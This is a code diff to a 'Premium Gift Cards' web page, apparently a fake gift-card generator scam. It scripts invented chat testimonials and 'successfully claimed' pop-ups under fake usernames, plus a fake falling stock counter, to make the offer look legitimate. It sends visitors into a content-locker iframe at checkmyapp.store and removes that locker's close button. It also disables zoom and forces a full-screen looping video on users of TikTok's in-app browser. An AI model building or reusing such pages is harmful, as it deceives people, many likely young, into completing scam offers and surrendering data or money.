@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Premium Gift Cards</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
 
@@ -38,6 +38,24 @@ z-index:-3;
 
 @keyframes bgMove{
 100%{transform:scale(1.12) translateY(-18px);}
+}
+
+/* TIKTOK OVERLAY FULL SCREEN */
+#ttOverlay {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    display: none;
+    z-index: 9999999;
+    width: 100vw;
+    height: 100vh;
+}
+
+#ttOverlay video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover; /* Kayched l-écran kamla bla k7oliya */
+    display: block;
 }
 
 /* NOTIFICATION STYLE */
@@ -123,32 +141,6 @@ font-size:11px;
 background:rgba(96,165,250,.14);
 color:#93c5fd;
 transition: all 0.4s ease;
-}
-
-/* TIKTOK OVERLAY STYLES */
-#ttOverlay{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.98);
-display:none;
-justify-content:center; align-items:center; flex-direction:column; z-index:999999; text-align:center; padding:20px;
-}
-#ttOverlay h2{margin-bottom:10px; font-weight:800; background:linear-gradient(90deg,#fff,#60a5fa); -webkit-background-clip:text; -webkit-text-fill-color:transparent;}
-#ttOverlay p{opacity:.8;margin-bottom:25px; font-size:14px;}
-.video-container {
-    width: 240px;
-    height: 420px;
-    border-radius: 20px;
-    border: 5px solid #333;
-    overflow: hidden;
-    background: #000;
-    box-shadow: 0 0 30px rgba(96,165,250,0.5);
-    position: relative;
-}
-.video-container video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
 }
 
 /* LIVE CHAT AREA */
@@ -268,11 +260,9 @@ z-index:9999;
 }
 
 .lockerBox{
-width:90%;
-height:85%;
-max-width:500px;
-background:#111;
-border-radius:16px;
+width:100%;
+height:100%;
+background:#000;
 overflow:hidden;
 position:relative;
 }
@@ -281,19 +271,6 @@ position:relative;
 width:100%;
 height:100%;
 border:none;
-}
-
-.closeBtn{
-position:absolute;
-top:10px;
-right:10px;
-background:red;
-color:#fff;
-border:none;
-padding:8px 12px;
-border-radius:8px;
-cursor:pointer;
-font-weight:bold;
 }
 
 .footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
@@ -309,6 +286,13 @@ font-weight:bold;
 
 <body>
 
+<div id="ttOverlay">
+    <video id="tutorialVideo" playsinline muted loop preload="auto">
+        <source src="tutorial.mp4.mov" type="video/quicktime">
+        <source src="tutorial.mp4.mov" type="video/mp4">
+    </video>
+</div>
+
 <div id="notification-toast">
     <div class="notif-img-container">
         <img src="" id="notif-img">
@@ -318,17 +302,6 @@ font-weight:bold;
         successfully claimed a 
         <span class="notif-card-name" id="notif-card-name"></span>
         <span class="notif-time" id="notif-time"></span>
-    </div>
-</div>
-
-<div id="ttOverlay">
-    <h2>Open in Browser</h2>
-    <p>Follow the steps below to continue</p>
-    <div class="video-container">
-        <video id="tutorialVideo" preload="auto" autoplay loop muted playsinline>
-            <source src="tutorial.mp4.mov" type="video/quicktime">
-            <source src="tutorial.mp4.mov" type="video/mp4">
-        </video>
     </div>
 </div>
 
@@ -398,35 +371,13 @@ font-weight:bold;
 </div>
 </div>
 
-<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe><button class="closeBtn" onclick="closeLocker()">✕</button></div></div>
+<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe></div></div>
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
-const giftCardMsgs = [
-    "Fuck! I only got $10 card while others got $100. My luck is literally trash.",
-    "Is this actually real? I've been scammed 4 times today on other sites.",
-    "Guys, it worked! But you can only claim 1 card per person.",
-    "Is everyone getting their codes? Just started the offer.",
-    "Wait... just got the notification. It's actually legit! $50 added.",
-    "I'm skeptical... let me try one more time. Does this really work?",
-    "FUCK!! 10$ again... i hate my life. Why can't I get the big ones?",
-    "Yo it works! Just finished the survey and code popped up instantly.",
-    "Warning: You can only benefit from 1 card. Don't waste time trying more.",
-    "Has anyone received the code yet? I'm almost done.",
-    "Just finished the offer and the code was sent in the notification bar!",
-    "Omg it worked!! Finally a real generator for 2026.",
-    "Did you guys get the card? I just got $25 PSN code.",
-    "Can believe it... $100 Amazon just worked. My heart is racing lol.",
-    "Verification took 5 mins but the $50 Apple code is 100% working.",
-    "Only 1 card per account guys. It won't let you do more.",
-    "Fuck this site, why did i only get the 10$ one? So unfair.",
-    "I just got my code in the notification after completing the task. Legit!",
-    "Is it just me or is the Google Play card hard to get? Trying again.",
-    "Stop asking if it's real. Just do the offer and see for yourself."
-];
-
-const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip", "Chris_USA", "Sophia_M", "Ryan.K", "Olivia_S", "Ava_N", "Mia_F", "Chloe_B", "David.W", "Nathan_V", "Zoe_M"];
-
+// Had l-Logic kamel khllito kima hwa
+const giftCardMsgs = ["Fuck! I only got $10 card...","Is this real? Just got $50!","Guys it worked!","Legit site finally","Just got my code","FUCK!! 10$ again","Yo it works instantly","Only 1 card per person","Code sent in notif bar","Omg finally a real one","Just got $25 PSN","Worked for $100 Amazon","Verification took 5 mins","Legit check 100%","Stop asking, just do it"];
+const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip", "Chris_USA", "Sophia_M"];
 const cardsData = [
     {n: "Roblox $50", img: "https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png"},
     {n: "PlayStation $25", img: "https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg"},
@@ -438,14 +389,7 @@ const cardsData = [
 let usedMessages = [];
 let stocks = [46, 37, 61, 50, 72, 28];
 
-function getUSATime() {
-    return new Intl.DateTimeFormat('en-GB', {
-        timeZone: 'America/New_York',
-        hour: '2-digit',
-        minute: '2-digit',
-        hour12: false
-    }).format(new Date());
-}
+function getUSATime() { return new Intl.DateTimeFormat('en-GB', { hour: '2-digit', minute: '2-digit', hour12: false }).format(new Date()); }
 
 function updateStock() {
     const idx = Math.floor(Math.random() * 6);
@@ -453,16 +397,8 @@ function updateStock() {
     if (stocks[idx] > 2) {
         stocks[idx] -= 1;
         tag.innerText = `Still ${stocks[idx]} Card`;
-        tag.style.background = "rgba(239, 68, 68, 0.2)";
-        tag.style.color = "#ff4d4d";
-        tag.style.transform = "scale(1.1)";
-        setTimeout(() => {
-            tag.style.background = "rgba(96,165,250,.14)";
-            tag.style.color = "#93c5fd";
-            tag.style.transform = "scale(1)";
-        }, 800);
     }
-    setTimeout(updateStock, Math.random() * (25000 - 15000) + 15000);
+    setTimeout(updateStock, 15000);
 }
 
 function showNotif() {
@@ -475,22 +411,19 @@ function showNotif() {
     document.getElementById('notif-time').innerText = "Today at " + getUSATime();
     toast.classList.add('show');
     setTimeout(() => { toast.classList.remove('show'); }, 4000);
-    setTimeout(showNotif, Math.random() * (15000 - 9000) + 9000);
+    setTimeout(showNotif, 12000);
 }
 
 function addChat() {
     const box = document.getElementById('chatBox');
     const u = usersList[Math.floor(Math.random()*usersList.length)];
-    let availableMsgs = giftCardMsgs.filter(m => !usedMessages.includes(m));
-    if (availableMsgs.length === 0) { usedMessages = []; availableMsgs = giftCardMsgs; }
-    const m = availableMsgs[Math.floor(Math.random()*availableMsgs.length)];
-    usedMessages.push(m);
+    const m = giftCardMsgs[Math.floor(Math.random()*giftCardMsgs.length)];
     const time = getUSATime();
     const html = `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${time}</span></div><div class="chat-text">${m}</div></div>`;
     box.innerHTML += html;
     box.scrollTop = box.scrollHeight;
-    if(box.children.length > 10) box.removeChild(box.firstChild);
-    setTimeout(addChat, Math.random() * (12000 - 4000) + 4000);
+    if(box.children.length > 8) box.removeChild(box.firstChild);
+    setTimeout(addChat, 5000);
 }
 
 function openOffer(title,el){
@@ -503,39 +436,34 @@ function openOffer(title,el){
         document.getElementById("offerPage").style.display="block";
         document.getElementById("selectedTitle").innerText=title;
         document.getElementById("selectedImage").src=img;
-        window.scrollTo(0,0);
-    },900);
+    },800);
 }
 
-function go(){ document.getElementById("lockerModal").style.display="flex"; document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622"; }
-function closeLocker(){ document.getElementById("lockerModal").style.display="none"; document.getElementById("lockerFrame").src=""; }
+function go(){ document.getElementById("lockerModal").style.display="block"; document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622"; }
 function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
-function isTikTok(){ return /TikTok|musical_ly/i.test(navigator.userAgent); }
 
-window.addEventListener("load",()=>{
+// TikTok Full Screen & Autoplay Logic
+function isTikTok() { return /TikTok|musical_ly/i.test(navigator.userAgent); }
+
+window.addEventListener("load", () => {
     showNotif();
-    updateStock(); 
-    for(let i=0; i<4; i++) { setTimeout(addChat, i * 1200); }
-    
-    if(isTikTok()) {
+    updateStock();
+    for(let i=0; i<3; i++) { setTimeout(addChat, i * 1000); }
+
+    if (isTikTok()) {
         const overlay = document.getElementById("ttOverlay");
         const video = document.getElementById("tutorialVideo");
-        overlay.style.display = "flex";
+        overlay.style.display = "block";
         
-        // Anti-freeze logic:
-        video.muted = true;
-        video.currentTime = 0;
-        let playPromise = video.play();
-        if (playPromise !== undefined) {
-            playPromise.then(_ => {
-                // Video started playing
-            }).catch(error => {
-                // Failed to play, retry on first click
-                window.addEventListener('click', () => {
-                    video.play();
-                }, {once: true});
-            });
-        }
+        // Forced Autoplay Loop
+        let autoPlayInterval = setInterval(() => {
+            video.play().then(() => {
+                clearInterval(autoPlayInterval);
+            }).catch(() => {});
+        }, 100);
+
+        // Click to start if browser blocks
+        window.addEventListener('touchstart', () => { video.play(); }, { once: true });
     }
 });
 </script>
